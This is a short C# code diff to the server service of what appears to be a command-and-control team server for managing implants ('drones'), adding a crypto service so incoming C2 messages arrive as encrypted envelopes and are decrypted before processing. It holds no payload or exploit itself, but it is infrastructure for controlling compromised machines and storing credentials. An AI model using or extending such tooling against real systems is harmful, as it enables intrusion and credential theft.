@@ -20,17 +20,19 @@ namespace TeamServer.Services
         private C2Profile _profile; 
             
         private readonly IDroneService _drones;
+        private readonly ICryptoService _crypto;
         private readonly ICredentialService _credentials;
         private readonly IHubContext<MessageHub, IMessageHub> _hub;
         
         private readonly List<Module> _modules = new();
 
-        public ServerService(IDroneService drones, ICredentialService credentials, IHubContext<MessageHub, IMessageHub> hub)
+        public ServerService(IDroneService drones, ICredentialService credentials, IHubContext<MessageHub, IMessageHub> hub, ICryptoService crypto)
         {
             _drones = drones;
+            _crypto = crypto;
             _credentials = credentials;
             _hub = hub;
-            
+
             LoadDefaultModules();
         }
 
@@ -68,8 +70,9 @@ namespace TeamServer.Services
             return _modules;
         }
 
-        public async Task HandleC2Message(C2Message message)
+        public async Task HandleC2Message(MessageEnvelope envelope)
         {
+            var message = _crypto.DecryptEnvelope(envelope);
             var drone = _drones.GetDrone(message.Metadata.Guid);
 
             if (drone is null)
@@ -123,9 +126,7 @@ namespace TeamServer.Services
             var self = Assembly.GetExecutingAssembly();
             
             foreach (var module in LoadModulesFromTypes(self.GetTypes()))
-            {
                 RegisterModule(module);
-            }
         }
 
         private IEnumerable<Module> LoadModulesFromTypes(IEnumerable<Type> types)
